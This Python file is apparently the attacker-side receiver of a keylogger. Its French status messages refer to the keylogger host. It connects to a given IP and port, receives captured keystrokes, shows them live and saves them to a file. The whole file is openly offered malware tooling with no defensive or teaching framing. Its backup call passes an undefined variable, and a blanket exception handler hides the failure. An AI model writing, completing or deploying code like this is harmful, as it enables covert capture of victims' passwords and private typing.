import os
import socket
import sys
import threading
import time
import platform
from multiprocessing import Process, freeze_support
class live_recever():
    def __init__(self):
        self.keys = ''
        self.recever()

        
    def display(self):
        while True:
            try:
                if platform.system() == "Windows":
                    print(self.keys, end = '')
                    os.system("cls")
                elif platform.system() == "Linux":
                    print(self.keys, end ='')
                    os.system("clear")
            except KeyboardInterrupt:
                exit(1)
    def backup(self,keys,OUTPUT_FILE_NAME):
        f = open(OUTPUT_FILE_NAME, "w")
        f.write(keys)
        f.close()

    def recever(self):
        IP = input("EnTeR aN IP AdDrEsS : \n-->")
        PORT = int(input("EnTeR a PoRt t0 ReCieVE : \n-->"))
        OUTPUT_FILE_NAME = input("EntEr A nAmE T0 crEaTe aN 0utPuT FilE : \n-->")
        print("[!]Création du socket..")
        socket_recever = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
        print("[OK]Socket initialisé")
        print("[!]Connection a l'hote du keylogger...")
        open(OUTPUT_FILE_NAME,"w")
        connected = False
        tries = 0
        while connected != True :
            try :
                socket_recever.connect((IP,PORT))
                connected = True
            except:
                tries +=1
                sys.stdout.write("\r\t\t{} attemps".format(tries))
        print("[OK]Connecté\n|\n|\n|\n[+]Live keylogger :\n")
        tries = 0
        count = 0

        display = threading.Thread(target = self.display)
        display.start()
        #backup = Process(target = self.backup)
        #backup.start()
        while True:
            try:
                self.keys += socket_recever.recv(999).decode("utf-8")
                self.backup(keys,OUTPUT_FILE_NAME)
            except :
                tries +=1

if __name__ == "__main__":
    freeze_support()
    live_recever1 = live_recever()
